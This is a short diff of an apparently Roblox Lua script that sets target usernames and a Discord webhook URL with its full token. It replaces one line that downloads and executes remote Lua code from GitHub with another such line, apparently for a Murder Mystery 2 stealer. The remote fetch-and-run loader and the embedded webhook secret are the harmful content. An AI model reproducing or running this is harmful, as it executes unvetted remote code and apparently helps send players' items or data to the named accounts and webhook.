@@ -1,4 +1,4 @@
 
 Username = {"pablogarote","evo12342jjj"} 
 Webhook = "https://discordapp.com/api/webhooks/1369963991027421194/_Sfo6iLw4ipiYXvkyaNUfH-sOHCXZUCHwfxPxorsAE1R0T_vERhVY8gTl6dI8n2K4VO_" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/MM2/refs/heads/main/Protected_MM2"))()
